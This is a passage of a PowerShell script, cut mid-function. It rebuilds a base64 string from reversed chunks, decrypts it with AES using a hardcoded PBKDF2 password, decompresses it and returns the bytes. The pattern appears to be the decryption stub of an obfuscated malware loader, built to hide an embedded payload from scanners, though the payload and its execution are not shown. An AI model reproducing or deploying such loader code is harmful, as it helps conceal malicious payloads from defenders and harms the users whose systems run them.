[array]::Reverse($chunks)
$b64=$chunks -join ''
$b64=$b64.TrimEnd('=')
$raw=[Convert]::FromBase64String($b64)
$salt=$raw[0..15]
$iv=$raw[16..31]
$ct=$raw[32..($raw.Length-1)]
$pass='VrJfv5RaQ7JvJ6CNOJd0IBsJlCWPvGiE'
$key=[Security.Cryptography.Rfc2898DeriveBytes]::new($pass,$salt,10000).GetBytes(32)
$aes=[Security.Cryptography.Aes]::Create()
$aes.Mode='CBC'
$aes.Padding='PKCS7'
$aes.Key=$key
$aes.IV=$iv
$decryptor=$aes.CreateDecryptor()
$ms=New-Object IO.MemoryStream(,$ct)
$cs=New-Object Security.Cryptography.CryptoStream($ms,$decryptor,'Read')
$out=New-Object IO.MemoryStream
$cs.CopyTo($out)
$out.Position=0
$gzip=New-Object IO.Compression.GzipStream($out,'Decompress')
$result=New-Object IO.MemoryStream
$gzip.CopyTo($result)
$result.ToArray()
}

